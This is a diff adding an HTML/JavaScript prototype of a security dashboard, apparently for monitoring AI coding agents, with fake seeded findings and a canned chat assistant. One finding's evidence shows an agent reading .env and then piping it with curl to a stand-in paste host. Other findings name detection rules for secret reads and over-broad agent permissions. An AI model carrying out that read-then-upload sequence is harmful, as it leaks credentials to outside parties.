@@ -1,0 +1,517 @@
+<!doctype html>
+<!--
+  PROTOTYPE, throw away. Question: what should Warden's main screen look like?
+  Three variants of the dashboard, switchable via ?variant=A|B|C and ?theme=light|dark.
+  Seeded, fake data. Nothing here goes into warden's main branch.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Warden dashboard prototype</title>
+<style>
+/* ---------- tokens per variant and theme ---------- */
+:root, [data-variant="A"][data-theme="light"], [data-variant="D"][data-theme="light"] {
+  --bg:#f7f4ee; --surface:#fffdf8; --fg:#23211d; --muted:#6b665c; --line:#e3ddd0;
+  --accent:#2f4b7c; --accent-fg:#fff; --sev-crit:#8a2c2c; --sev-high:#9a5b1e; --sev-med:#6b665c; --sev-low:#8f8a80;
+  --ok:#3d6b4a; --chip:#efe9dc; --font-head:"Iowan Old Style","Charter","Georgia",serif; --font-body:"Inter","Segoe UI",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace; --radius:2px;
+}
+[data-variant="A"][data-theme="dark"], [data-variant="D"][data-theme="dark"] {
+  --bg:#1c1b19; --surface:#24221f; --fg:#ece7dc; --muted:#a39d90; --line:#3a3732;
+  --accent:#9db4e0; --accent-fg:#1c1b19; --sev-crit:#e0928a; --sev-high:#e0b27a; --sev-med:#a39d90; --sev-low:#7d786e;
+  --ok:#8fc19c; --chip:#2e2b27;
+}
+[data-variant="B"][data-theme="dark"] {
+  --bg:#0f1417; --surface:#151c20; --fg:#d7e0e3; --muted:#7f8f95; --line:#24313a;
+  --accent:#4fb3a9; --accent-fg:#0b1214; --sev-crit:#e7837a; --sev-high:#e0b064; --sev-med:#8fa9b3; --sev-low:#5f7178;
+  --ok:#6cc38a; --chip:#1c262c; --font-head:"Inter","Segoe UI",system-ui,sans-serif; --font-body:"Inter","Segoe UI",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace; --radius:4px;
+}
+[data-variant="B"][data-theme="light"] {
+  --bg:#f3f6f7; --surface:#ffffff; --fg:#14202a; --muted:#5d6d75; --line:#dbe3e6;
+  --accent:#1f7a71; --accent-fg:#fff; --sev-crit:#b23b32; --sev-high:#9a6a14; --sev-med:#4d6b77; --sev-low:#82939a;
+  --ok:#2e7d4f; --chip:#e7eef0; --font-head:"Inter","Segoe UI",system-ui,sans-serif; --font-body:"Inter","Segoe UI",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace; --radius:4px;
+}
+[data-variant="C"][data-theme="light"] {
+  --bg:#f5f3fb; --surface:#ffffff; --fg:#2a2540; --muted:#6c6787; --line:#e6e2f2;
+  --accent:#5b4bc4; --accent-fg:#fff; --sev-crit:#c2456b; --sev-high:#c97a2b; --sev-med:#6c6787; --sev-low:#9a96ae;
+  --ok:#2f8f6b; --chip:#eeebfa; --font-head:"Nunito","Segoe UI",system-ui,sans-serif; --font-body:"Nunito","Segoe UI",system-ui,sans-serif;
+  --font-mono:ui-monospace,monospace; --radius:16px;
+}
+[data-variant="C"][data-theme="dark"] {
+  --bg:#17152a; --surface:#211e38; --fg:#ece9fb; --muted:#a49fc4; --line:#332f52;
+  --accent:#a99bff; --accent-fg:#17152a; --sev-crit:#f08cab; --sev-high:#f0b27a; --sev-med:#a49fc4; --sev-low:#77729a;
+  --ok:#7fd6b0; --chip:#2b2748; --font-head:"Nunito","Segoe UI",system-ui,sans-serif; --font-body:"Nunito","Segoe UI",system-ui,sans-serif;
+  --font-mono:ui-monospace,monospace; --radius:16px;
+}
+* { box-sizing:border-box; }
+body { margin:0; background:var(--bg); color:var(--fg); font-family:var(--font-body); font-size:15px; line-height:1.5; }
+button, input { font:inherit; color:inherit; }
+a { color:var(--accent); }
+code, .mono { font-family:var(--font-mono); font-size:.86em; }
+.sev { font-weight:600; white-space:nowrap; }
+.sev-Critical { color:var(--sev-crit); } .sev-High { color:var(--sev-high); } .sev-Medium { color:var(--sev-med); } .sev-Low { color:var(--sev-low); }
+.muted { color:var(--muted); }
+.btn { background:var(--accent); color:var(--accent-fg); border:0; border-radius:var(--radius); padding:6px 12px; cursor:pointer; }
+.btn.ghost { background:transparent; color:var(--accent); border:1px solid var(--line); }
+.btn:focus-visible, input:focus-visible, [tabindex]:focus-visible { outline:2px solid var(--accent); outline-offset:2px; }
+table { border-collapse:collapse; width:100%; }
+.flag { font-size:.75em; border:1px solid var(--line); border-radius:var(--radius); padding:1px 6px; color:var(--muted); white-space:nowrap; }
+
+/* ---------- switcher (not part of the design) ---------- */
+#proto-bar { position:fixed; bottom:16px; left:50%; transform:translateX(-50%); z-index:99; display:flex; gap:8px; align-items:center;
+  background:#111; color:#fff; padding:6px 10px; border-radius:999px; box-shadow:0 6px 24px rgba(0,0,0,.35); font:13px system-ui,sans-serif; }
+#proto-bar button { background:#333; color:#fff; border:0; border-radius:999px; padding:4px 10px; cursor:pointer; }
+#proto-bar .lbl { min-width:190px; text-align:center; }
+
+/* ---------- A: Quiet ledger ---------- */
+.A-wrap { max-width:880px; margin:0 auto; padding:40px 20px 120px; }
+.A-wrap h1, .A-wrap h2 { font-family:var(--font-head); font-weight:500; letter-spacing:-.01em; }
+.A-wrap h1 { font-size:30px; margin:0 0 4px; }
+.A-wrap h2 { font-size:20px; margin:36px 0 10px; border-bottom:1px solid var(--line); padding-bottom:6px; }
+.A-meta { display:flex; flex-wrap:wrap; gap:6px 18px; color:var(--muted); font-size:13px; }
+.A-lede { font-family:var(--font-head); font-size:19px; margin:24px 0 0; }
+.A-top { counter-reset:t; list-style:none; padding:0; margin:0; }
+.A-top li { counter-increment:t; display:grid; grid-template-columns:32px 1fr auto; gap:4px 12px; padding:12px 0; border-bottom:1px solid var(--line); }
+.A-top li::before { content:counter(t) "."; font-family:var(--font-head); font-size:18px; color:var(--muted); }
+.A-top .why { grid-column:2; color:var(--muted); font-size:13px; }
+.A-filters { display:flex; flex-wrap:wrap; gap:6px; margin:6px 0 10px; font-size:13px; }
+.A-filters button { background:none; border:0; border-bottom:1px solid transparent; padding:2px 0; margin-right:10px; cursor:pointer; color:var(--muted); }
+.A-filters button[aria-pressed="true"] { color:var(--fg); border-bottom-color:var(--fg); }
+.A-wrap table td, .A-wrap table th { text-align:left; padding:8px 8px 8px 0; border-bottom:1px solid var(--line); vertical-align:top; font-size:14px; }
+.A-wrap table th { font-weight:500; color:var(--muted); font-size:12px; text-transform:uppercase; letter-spacing:.06em; }
+.A-audit { background:var(--surface); border:1px solid var(--line); padding:16px 20px; }
+.A-audit dl { display:grid; grid-template-columns:110px 1fr; gap:6px 12px; margin:8px 0 0; font-size:14px; }
+.A-ask { position:fixed; right:24px; bottom:72px; width:340px; background:var(--surface); border:1px solid var(--line); box-shadow:0 2px 0 var(--line); }
+.A-ask header { padding:10px 14px; border-bottom:1px solid var(--line); font-family:var(--font-head); }
+@media (max-width:1680px){ .A-ask { position:static; width:auto; margin-top:32px; } }
+
+/* ---------- B: Calm console ---------- */
+.B-app { display:grid; grid-template-columns:200px 1fr 380px; height:100vh; }
+.B-nav { border-right:1px solid var(--line); padding:14px 10px; background:var(--surface); display:flex; flex-direction:column; gap:2px; font-size:14px; }
+.B-nav .brand { font-weight:700; letter-spacing:.04em; padding:4px 8px 14px; }
+.B-nav a { color:var(--muted); text-decoration:none; padding:6px 8px; border-radius:var(--radius); display:flex; justify-content:space-between; }
+.B-nav a.on { background:var(--chip); color:var(--fg); }
+.B-nav .level { margin-top:auto; font-size:12px; color:var(--muted); padding:8px; border-top:1px solid var(--line); }
+.B-main { overflow:auto; padding:14px 18px 90px; }
+.B-bar { display:flex; gap:8px; align-items:center; flex-wrap:wrap; margin-bottom:10px; }
+.B-bar .chip { background:var(--chip); border:1px solid var(--line); border-radius:var(--radius); padding:3px 8px; font-size:12px; cursor:pointer; }
+.B-bar .chip[aria-pressed="true"] { border-color:var(--accent); color:var(--accent); }
+.B-url { font-family:var(--font-mono); font-size:11px; color:var(--muted); margin-left:auto; }
+.B-kpis { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:12px; }
+.B-kpis div { background:var(--surface); border:1px solid var(--line); border-radius:var(--radius); padding:8px 10px; font-size:12px; color:var(--muted); }
+.B-kpis b { display:block; font-size:20px; color:var(--fg); font-weight:600; }
+.B-main table { font-size:13px; }
+.B-main th { text-align:left; color:var(--muted); font-weight:500; font-size:11px; text-transform:uppercase; letter-spacing:.05em; padding:6px 8px; border-bottom:1px solid var(--line); }
+.B-main td { white-space:normal; padding:7px 8px; border-bottom:1px solid var(--line); }
+.B-main tr.row { cursor:pointer; } .B-main tr.row:hover, .B-main tr.row.sel { background:var(--chip); }
+.B-side { border-left:1px solid var(--line); background:var(--surface); display:flex; flex-direction:column; min-height:0; }
+.B-detail { padding:14px 16px; overflow:auto; flex:1; font-size:14px; }
+.B-detail pre { background:var(--bg); border:1px solid var(--line); border-radius:var(--radius); padding:8px; font-family:var(--font-mono); font-size:12px; white-space:pre-wrap; }
+.B-chat { border-top:1px solid var(--line); padding:10px 12px 70px; font-size:13px; }
+@media (max-width:1100px){ .B-app { grid-template-columns:1fr; height:auto; } .B-nav { flex-direction:row; flex-wrap:wrap; } .B-side { border-left:0; } }
+
+/* ---------- C: Friendly guide ---------- */
+.C-wrap { max-width:1080px; margin:0 auto; padding:28px 20px 140px; }
+.C-hello { font-family:var(--font-head); font-size:28px; font-weight:800; margin:0; }
+.C-steps { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin:20px 0 28px; }
+.C-step { background:var(--surface); border:1px solid var(--line); border-radius:var(--radius); padding:14px 16px; }
+.C-step.now { border:2px solid var(--accent); }
+.C-step small { color:var(--muted); display:block; }
+.C-step .bar { height:6px; background:var(--chip); border-radius:6px; margin-top:10px; overflow:hidden; }
+.C-step .bar i { display:block; height:100%; background:var(--accent); }
+.C-cards { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:14px; }
+.C-card { background:var(--surface); border:1px solid var(--line); border-radius:var(--radius); padding:16px 18px; display:flex; flex-direction:column; gap:8px; }
+.C-card h3 { margin:0; font-size:17px; }
+.C-card .tag { font-size:12px; color:var(--muted); }
+.C-card .actions { margin-top:auto; display:flex; gap:8px; }
+.C-pill { display:inline-block; font-size:12px; font-weight:700; padding:2px 10px; border-radius:999px; background:var(--chip); }
+.C-more { margin-top:28px; background:var(--surface); border:1px solid var(--line); border-radius:var(--radius); padding:10px 16px; }
+.C-more summary { cursor:pointer; font-weight:700; padding:6px 0; }
+.C-more td, .C-more th { text-align:left; padding:7px 8px; border-bottom:1px solid var(--line); font-size:14px; }
+.C-buddy { position:fixed; right:22px; bottom:70px; width:330px; background:var(--surface); border:1px solid var(--line); border-radius:var(--radius); box-shadow:0 10px 30px rgba(40,30,90,.18); overflow:hidden; }
+.C-buddy header { background:var(--accent); color:var(--accent-fg); padding:10px 14px; font-weight:700; }
+@media (max-width:1680px){ .C-buddy { position:static; width:auto; margin-top:24px; } }
+@media (max-width:900px){ .C-steps { grid-template-columns:1fr; } }
+
+[data-variant="E"][data-theme="light"] {
+  --bg:#f7f5f0; --surface:#fffefb; --fg:#26241f; --muted:#69655c; --line:#e6e1d6;
+  --accent:#36569a; --accent-fg:#fff; --sev-crit:#9b3434; --sev-high:#8f5416; --sev-med:#5f6b78; --sev-low:#6b665d;
+  --ok:#3d7a52; --chip:#f0ebe1; --font-head:"Iowan Old Style","Charter","Georgia",serif; --font-body:"Inter","Segoe UI",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace; --radius:10px;
+  --tint-crit:#f6e4e1; --tint-high:#f7ead9; --tint-med:#e8ecf0; --tint-low:#efede8; --focus-bg:#eef2f8; --focus-line:#cdd8ea; --shadow:0 1px 2px rgba(60,50,30,.06),0 4px 14px rgba(60,50,30,.05);
+}
+[data-variant="E"][data-theme="dark"] {
+  --bg:#1d1c1a; --surface:#262421; --fg:#ece7dc; --muted:#a6a093; --line:#3a3732;
+  --accent:#a3b9e6; --accent-fg:#1d1c1a; --sev-crit:#e7978f; --sev-high:#e6b57d; --sev-med:#a9b6c4; --sev-low:#9d978b;
+  --ok:#8fc19c; --chip:#302d29; --font-head:"Iowan Old Style","Charter","Georgia",serif; --font-body:"Inter","Segoe UI",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace; --radius:10px;
+  --tint-crit:#3a2624; --tint-high:#3a2e20; --tint-med:#2a2f35; --tint-low:#2c2a27; --focus-bg:#252b36; --focus-line:#38465c; --shadow:0 1px 2px rgba(0,0,0,.25),0 4px 14px rgba(0,0,0,.18);
+}
+.friendly .D-card, .friendly .A-audit, .friendly .D-journey > div { border-radius:var(--radius); box-shadow:var(--shadow); }
+.friendly .D-card { gap:8px; padding:14px 16px; }
+.friendly .pill { display:inline-block; font-size:12px; font-weight:600; padding:1px 9px; border-radius:999px; }
+.friendly .pill.sev-Critical { background:var(--tint-crit); } .friendly .pill.sev-High { background:var(--tint-high); }
+.friendly .pill.sev-Medium { background:var(--tint-med); } .friendly .pill.sev-Low { background:var(--tint-low); }
+.friendly .D-detail pre, .friendly .chat-form input, .friendly .btn, .friendly .msg { border-radius:8px; }
+.friendly .D-main h2 { border-bottom:0; font-size:20px; }
+.friendly .D-lede { font-family:var(--font-head); font-size:18px; margin:18px 0 0; }
+.friendly .D-side { background:var(--bg); } .friendly .D-detail { background:var(--surface); margin:12px; border-radius:var(--radius); box-shadow:var(--shadow); flex:1; }
+.friendly .D-chat { background:var(--surface); margin:0 12px 12px; border:0; border-radius:var(--radius); box-shadow:var(--shadow); }
+/* E: one panel, closed / floating / pinned */
+.E-app .D-main { margin:0 auto; max-width:1480px; }
+.E-app.pinned { display:grid; grid-template-columns:minmax(0,1fr) 6px var(--pw,400px); }
+.E-app.pinned .D-main { margin:0; }
+.E-panel { background:var(--bg); display:flex; flex-direction:column; border:1px solid var(--line); min-height:0; }
+.E-panel.floating { position:fixed; top:16px; right:16px; bottom:76px; width:var(--pw,400px); z-index:50; border-radius:14px; box-shadow:0 14px 44px rgba(40,30,10,.20); overflow:hidden; }
+.E-panel.pinned { position:sticky; top:0; height:100vh; border-width:0; }
+.E-panel header { display:flex; align-items:center; gap:6px; padding:10px 12px; border-bottom:1px solid var(--line); background:var(--surface); }
+.E-panel header .t { flex:1; font-family:var(--font-head); font-size:16px; }
+.E-panel .icon { background:none; border:1px solid var(--line); border-radius:8px; padding:2px 9px; cursor:pointer; color:var(--muted); font-size:12px; }
+.E-panel .icon[aria-pressed="true"] { color:var(--accent); border-color:var(--accent); }
+.E-body { flex:1; overflow:auto; display:flex; flex-direction:column; min-height:0; }
+.E-body { padding-bottom:10px; }
+.E-body .D-detail { flex:0 0 auto; max-height:48%; overflow:auto; margin:10px 10px 0; position:relative; }
+.E-body .D-chat { flex:1; display:flex; flex-direction:column; min-height:0; margin:10px; padding-bottom:0; }
+.E-body .chat-log { flex:1; max-height:none; }
+.friendly .E-body .D-detail { background:var(--focus-bg); border:1px solid var(--focus-line); box-shadow:none; }
+.E-body .D-detail pre { background:var(--surface); }
+.E-unfocus { position:absolute; top:8px; right:8px; background:none; border:0; color:var(--muted); cursor:pointer; font-size:13px; }
+.E-divider { cursor:col-resize; background:var(--line); position:sticky; top:0; height:100vh; }
+.E-divider:hover, .E-divider:focus-visible { background:var(--accent); outline:none; }
+.E-open { position:fixed; right:22px; bottom:22px; z-index:50; border-radius:999px; padding:10px 18px; box-shadow:0 8px 24px rgba(40,30,10,.22); }
+.ctl-row { cursor:pointer; } .ctl-row.sel { background:var(--chip); }
+.E-ctl-list { list-style:none; padding:0; margin:8px 0 0; }
+.E-ctl-list li { padding:8px 0; border-top:1px solid var(--line); cursor:pointer; }
+.E-ctl-list li:hover { color:var(--accent); }
+.ctx { font-size:11px; color:var(--muted); padding:6px 14px 0; border-top:1px solid var(--line); }
+.ctx b { color:var(--fg); font-weight:600; }
+
+/* ---------- D: combined (A look, C cards, B panel) ---------- */
+.D-app { display:grid; grid-template-columns:1fr 400px; min-height:100vh; }
+.D-main { padding:28px 32px 120px; max-width:1040px; }
+.D-head { display:flex; align-items:baseline; gap:20px; flex-wrap:wrap; }
+.D-head h1 { font-family:var(--font-head); font-weight:500; font-size:28px; margin:0; }
+.D-tabs { display:flex; gap:18px; font-size:14px; }
+.D-tabs button { background:none; border:0; border-bottom:1px solid transparent; padding:2px 0; cursor:pointer; color:var(--muted); }
+.D-tabs button[aria-pressed="true"] { color:var(--fg); border-bottom-color:var(--fg); }
+.D-meta { color:var(--muted); font-size:13px; margin:6px 0 0; display:flex; gap:6px 16px; flex-wrap:wrap; }
+.D-meta a { color:var(--accent); cursor:pointer; }
+.D-main h2 { font-family:var(--font-head); font-weight:500; font-size:19px; margin:28px 0 10px; border-bottom:1px solid var(--line); padding-bottom:6px; }
+.D-cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(170px,1fr)); gap:10px; }
+.D-card { background:var(--surface); border:1px solid var(--line); border-radius:var(--radius); padding:12px 14px; display:flex; flex-direction:column; gap:6px; cursor:pointer; }
+.D-card:hover, .D-card.sel { border-color:var(--accent); }
+.D-card .n { font-family:var(--font-head); color:var(--muted); font-size:16px; }
+.D-card h3 { margin:0; font-size:15px; font-weight:600; }
+.D-card .tag { font-size:12px; color:var(--muted); }
+.D-card .actions { margin-top:auto; padding-top:4px; }
+.D-filters { display:flex; flex-wrap:wrap; gap:4px 12px; margin:4px 0 8px; font-size:13px; align-items:center; }
+.D-filters button { background:none; border:0; border-bottom:1px solid transparent; padding:2px 0; cursor:pointer; color:var(--muted); }
+.D-filters button[aria-pressed="true"] { color:var(--fg); border-bottom-color:var(--fg); }
+.D-filters .url { margin-left:auto; font-family:var(--font-mono); font-size:11px; color:var(--muted); }
+.D-main table td, .D-main table th { text-align:left; padding:7px 8px 7px 0; border-bottom:1px solid var(--line); font-size:14px; vertical-align:top; }
+.D-main table th { font-weight:500; color:var(--muted); font-size:11px; text-transform:uppercase; letter-spacing:.06em; }
+.D-main tr.row { cursor:pointer; } .D-main tr.row:hover td, .D-main tr.row.sel td { background:var(--chip); }
+.D-side { border-left:1px solid var(--line); background:var(--surface); position:sticky; top:0; height:100vh; display:flex; flex-direction:column; }
+.D-detail { padding:18px 18px; overflow:auto; flex:1; font-size:14px; }
+.D-detail h3 { font-family:var(--font-head); font-weight:500; font-size:19px; margin:4px 0 6px; }
+.D-detail pre { background:var(--bg); border:1px solid var(--line); padding:8px; font-family:var(--font-mono); font-size:12px; white-space:pre-wrap; }
+.D-chat { border-top:1px solid var(--line); padding-bottom:64px; }
+.D-chat header { padding:8px 14px 0; font-family:var(--font-head); }
+.D-journey { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; }
+.D-journey > div { background:var(--surface); border:1px solid var(--line); padding:12px 14px; font-size:14px; }
+.D-journey > div.now { border-color:var(--accent); }
+.D-journey small { display:block; color:var(--muted); }
+.D-journey .bar { height:4px; background:var(--chip); margin-top:10px; } .D-journey .bar i { display:block; height:100%; background:var(--accent); }
+@media (max-width:1100px){ .D-app { grid-template-columns:1fr; } .D-side { position:static; height:auto; border-left:0; border-top:1px solid var(--line); } .D-journey { grid-template-columns:1fr; } }
+
+/* chat bits, shared look via tokens */
+.chat-log { display:flex; flex-direction:column; gap:8px; max-height:220px; overflow:auto; padding:10px 14px; font-size:13px; }
+.msg { padding:6px 10px; border-radius:var(--radius); max-width:92%; }
+.msg.me { align-self:flex-end; background:var(--chip); }
+.msg.bot { align-self:flex-start; border:1px solid var(--line); }
+.chat-form { display:flex; gap:6px; padding:8px 10px; border-top:1px solid var(--line); }
+.chat-form input { flex:1; background:var(--bg); border:1px solid var(--line); border-radius:var(--radius); padding:6px 8px; }
+.hint { font-size:11px; color:var(--muted); padding:0 14px 8px; }
+</style>
+</head>
+<body>
+<div id="app"></div>
+<div id="proto-bar" aria-label="Prototype switcher">
+  <button id="prev" aria-label="Previous variant">←</button>
+  <span class="lbl" id="lbl"></span>
+  <button id="next" aria-label="Next variant">→</button>
+  <button id="theme" aria-label="Toggle light and dark">◐</button>
+</div>
+<script>
+// ---------- seeded data (fake) ----------
+const TEAM = "Northwind Mobility";
+const FINDINGS = [
+ {id:"F-101", sev:"Critical", status:"Open", module:"Guard", rule:"guard/secret-in-repo", kind:"Repo", asset:"northwind/telemetry-api",
+  title:"An API key is committed in .env", plain:"A live-looking OpenRouter key is in the repo. Anyone with read access can use it.",
+  evidence:".env:3  OPENROUTER_API_KEY=sk-or-…a3f9  (masked)", fix:"Remove .env, add it to .gitignore, rotate the key", fixPR:true, age:"2 days", control:"ISA2027 4.1.3"},
+ {id:"F-102", sev:"High", status:"Open", module:"Guard", rule:"guard/agent-can-read-env", kind:"Repo", asset:"northwind/fleet-dashboard",
+  title:"Agents may read .env files", plain:"Claude Code's settings in this repo let an agent open secret files.",
+  evidence:".claude/settings.json:7  \"allow\": [\"Read(**)\"]  (no deny for .env)", fix:"Add deny rules for .env and keys", fixPR:true, age:"5 days", control:"ISA2027 4.1.3"},
+ {id:"F-103", sev:"High", status:"Open", module:"Guard", rule:"guard/agent-sends-secrets", kind:"Agent session", asset:"session 7c1e · pseudonymous dev d-41",
+  title:"An agent read .env, then called an unknown host", plain:"In one session the agent opened .env and then ran curl to a paste site. Nothing proves data left, but the pattern matches a leak.",
+  evidence:"14:02:11  Bash  cat .env\n14:02:19  Bash  curl -X POST https://paste.example.net/… -d @-\n(Judge: High, \"secret read then outbound call to unnamed host\")", fix:"Review the session; accept or mark false positive", fixPR:false, age:"1 day", control:"ISA2027 5.2.4"},
+ {id:"F-104", sev:"High", status:"Open", module:"Patch", rule:"patch/known-vulnerability", kind:"Product", asset:"Fleet Portal",
+  title:"A known vulnerability affects langchain-community", plain:"Fleet Portal uses a version with a published flaw (seeded example, not a real CVE).",
+  evidence:"CVE-2026-90001 (seeded) · CVSS 8.1 · fixed in 0.3.27 · installed 0.3.21", fix:"Upgrade to 0.3.27", fixPR:true, age:"3 days", control:"ISA2027 5.2.5"},
+ {id:"F-105", sev:"Medium", status:"Open", module:"Guard", rule:"guard/mcp-server-unpinned", kind:"Repo", asset:"northwind/telemetry-api",
+  title:"An MCP server runs without a pinned version", plain:"The agent starts a tool server straight from npm, so any new release runs unreviewed.",
+  evidence:".mcp.json:4  \"command\": \"npx\", \"args\": [\"some-mcp-server\"]", fix:"Pin the version", fixPR:true, age:"9 days", control:"ISA2027 1.3.4"},
+ {id:"F-106", sev:"Medium", status:"Open", module:"Guard", rule:"guard/unapproved-ai-tool", kind:"Repo", asset:"northwind/ota-updater",
+  title:"Another AI tool is set up but not approved", plain:"This repo has Cursor rules, and Cursor isn't on the Team's approved tools list.",
+  evidence:".cursorrules present · approved tools: Claude Code", fix:"Approve Cursor, or remove its config", fixPR:false, age:"12 days", control:"ISA2027 1.3.3"},
+ {id:"F-107", sev:"Low", status:"Open", module:"Guard", rule:"guard/ai-commit-untraced", kind:"Repo", asset:"northwind/ota-updater",
+  title:"Agent-made commits with no matching session", plain:"Three commits say an agent co-wrote them, but no Agent session reached Warden.",
+  evidence:"3 commits with Co-Authored-By: an AI agent · 0 matching sessions", fix:"Turn on the agent hook for this repo", fixPR:false, age:"6 days", control:"ISA2027 5.2.4"},
+ {id:"F-108", sev:"Medium", status:"Accepted", module:"Patch", rule:"patch/known-vulnerability", kind:"Product", asset:"Fleet Portal",
+  title:"A flaw in a PDF library we don't call", plain:"Accepted: not affected, the vulnerable function isn't used.", evidence:"Accepted by J. Ortiz · reason: not affected · expires 2027-02-01", fix:"—", fixPR:false, age:"20 days", control:"ISA2027 5.2.5"},
+ {id:"F-109", sev:"Low", status:"False positive", module:"Guard", rule:"guard/secret-in-repo", kind:"Repo", asset:"northwind/docs",
+  title:"Example key in documentation", plain:"Marked wrong: it's a placeholder in a tutorial.", evidence:"docs/setup.md:41  sk-or-EXAMPLE", fix:"—", fixPR:false, age:"30 days", control:"—"},
+ {id:"F-110", sev:"High", status:"Fixed", unconfirmed:true, module:"Guard", rule:"guard/secret-in-repo", kind:"Repo", asset:"northwind/fleet-dashboard",
+  title:"A token was removed, but may have moved", plain:"The last Scan no longer sees it in config/dev.env, and found a new one in config/.env.local.", evidence:"Unconfirmed fix · new Finding F-111 on the same Rule and Repo", fix:"Confirm the fix, or mark it moved", fixPR:false, age:"1 day", control:"ISA2027 4.1.3"},
+];
+const SEV_ORDER = {Critical:0, High:1, Medium:2, Low:3};
+const open = () => FINDINGS.filter(f => f.status === "Open");
+const top5 = () => open().sort((a,b)=>SEV_ORDER[a.sev]-SEV_ORDER[b.sev]).slice(0,5);
+const AUDIT = [
+  {c:"1.3.3", q:"Only approved external IT services (incl. AI agents)", v:"partly evidenced", why:"Cursor in use, not approved (F-106)"},
+  {c:"1.3.4", q:"Only approved software", v:"partly evidenced", why:"Unpinned MCP server (F-105)"},
+  {c:"5.2.4", q:"Event logs recorded and checked", v:"partly evidenced", why:"41 of 44 sessions judged; 3 commits untraced (F-107)"},
+];
+
+// ---------- view state in the URL (set_view stand-in) ----------
+const P = new URLSearchParams(location.search);
+const state = { variant: P.get("variant") || "A", theme: P.get("theme") || (P.get("variant")==="B" ? "dark" : "light"),
+  sev: P.get("sev") || "all", status: P.get("status") || "Open", module: P.get("module") || "all", sel: P.get("sel") || "F-103",
+  chat: [], page: P.get("page") || "findings", panel: P.get("panel") || "closed", pw: 400, ctl: null };
+// populated chat in every variant, so density is compared fairly
+state.chat = [{who:"me", text:"what should I fix first?"},
+  {who:"bot", text:"Start with F-101: a live-looking OpenRouter key is committed in telemetry-api (ISA2027 4.1.3). A fix PR is ready; rotate the key too. Then F-103: an agent read .env and called a paste site."},
+  {who:"me", text:"show only high"},
+  {who:"bot", text:"Done: severity High. The view is findings?status=Open&sev=High; Back undoes it."}];
+function pushURL(){ const q = new URLSearchParams({variant:state.variant, theme:state.theme});
+  if(state.sev!=="all") q.set("sev",state.sev); if(state.status!=="Open") q.set("status",state.status);
+  if(state.module!=="all") q.set("module",state.module); if("BDE".includes(state.variant)) q.set("sel",state.sel); if("DE".includes(state.variant)&&state.page!=="findings") q.set("page",state.page);
+  history.replaceState(null,"","?"+q.toString()); }
+function viewed(){ return FINDINGS.filter(f => (state.status==="all"||f.status===state.status) && (state.sev==="all"||f.sev===state.sev) && (state.module==="all"||f.module===state.module))
+  .sort((a,b)=>SEV_ORDER[a.sev]-SEV_ORDER[b.sev]); }
+function viewText(){ return `findings?status=${state.status}${state.sev!=="all"?"&sev="+state.sev:""}${state.module!=="all"?"&module="+state.module:""}`; }
+
+// fake chat: view changes act at once, data changes become a Proposal
+function reply(text){
+  const t = text.toLowerCase(); let changed = [];
+  for (const s of ["critical","high","medium","low"]) if (t.includes(s)) { state.sev = s[0].toUpperCase()+s.slice(1); changed.push("severity "+state.sev); }
+  if (t.includes("patch")||t.includes("cve")) { state.module="Patch"; changed.push("module Patch"); }
+  if (t.includes("guard")||t.includes("agent")) { state.module="Guard"; changed.push("module Guard"); }
+  if (t.includes("all")||t.includes("reset")||t.includes("clear")) { state.sev="all"; state.module="all"; state.status="Open"; changed=["filters cleared"]; }
+  if (t.includes("accept")) return "That changes data, so it's a Proposal: accept F-103 as expected behaviour, reason \"…\", expiry 30 days. Approve it in the Finding. (Prototype: nothing is saved.)";
+  if (t.includes("audit")||t.includes("ready")) return "Not yet. 3 Controls in VDA ISA2027 are partly evidenced: 1.3.3 (Cursor not approved, F-106), 1.3.4 (unpinned MCP server, F-105), 5.2.4 (3 untraced commits, F-107). Fixing F-105 and F-106 closes two.";
+  if (changed.length) return `Done: ${changed.join(", ")}. The view is ${viewText()}; Back undoes it.`;
+  return "Try: \"show only high\", \"just Patch\", \"are we ready for the audit?\", \"accept F-103\" or \"clear filters\".";
+}
+function ctxLine(){ const f = FINDINGS.find(x=>x.id===state.sel);
+  const view = state.page==="overview" ? "Overview" : ["Findings", state.status!=="all"?state.status:"", state.sev!=="all"?state.sev:"", state.module!=="all"?state.module:""].filter(Boolean).join(", ");
+  const focus = state.page==="overview" ? (state.ctl?`<b>ISA2027 ${state.ctl}</b> · `:"") : (f?`<b>${f.id}</b> · `:"");
+  return `<div class="ctx">Talking about: ${focus}view: ${view}</div>`; }
+function chatHTML(placeholder, ctx){
+  return `<div class="chat-log" id="log">${state.chat.length? state.chat.map(m=>`<div class="msg ${m.who}">${m.text}</div>`).join("")
+    : `<div class="msg bot">Ask about your findings, or tell me what to show. I change the view straight away; anything that changes data comes back as a Proposal for you to approve.</div>`}</div>
+   ${ctx?ctxLine():""}<form class="chat-form" id="chatf"><input id="chatin" placeholder="${placeholder}" aria-label="Message"><button class="btn">Send</button></form>
+   <div class="hint">Prototype chat: canned replies, view changes are real.</div>`;
+}
+
+// ---------- Variant A: Quiet ledger ----------
+function A(){
+  const t = top5();
+  return `<div class="A-wrap">
+   <div class="A-meta"><span>${TEAM}</span><span>Level: Quick → Standard</span><span>Last Scan: today 09:14, 6 Repos, 1 Product</span><span>Baseline: Default Pack</span></div>
+   <h1>Security record</h1>
+   <p class="A-lede">${open().length} open Findings, ${open().filter(f=>f.sev==="Critical").length} critical. Fix the five below first; they also close two audit Gaps.</p>
+   <h2>Fix these first</h2>
+   <ol class="A-top">${t.map(f=>`<li><div><span class="sev sev-${f.sev}">${f.sev}</span> · ${f.title}</div>
+      <div>${f.fixPR?`<button class="btn ghost">Open fix PR</button>`:`<span class="muted" style="font-size:13px">${f.fix}</span>`}</div>
+      <div class="why">${f.asset} · <code>${f.rule}</code> · ${f.control}</div></li>`).join("")}</ol>
+   <h2>All Findings</h2>
